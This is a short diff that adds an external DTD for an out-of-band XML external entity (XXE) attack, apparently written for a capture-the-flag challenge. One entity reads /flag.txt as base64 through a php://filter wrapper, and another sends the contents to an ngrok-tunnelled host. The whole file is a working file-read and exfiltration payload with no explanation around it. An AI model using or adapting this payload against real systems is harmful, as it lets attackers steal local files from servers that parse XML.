@@ -1,0 +1,3 @@
+
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://87b6-103-164-132-85.ap.ngrok.io/dtd.xml?%data;'>">
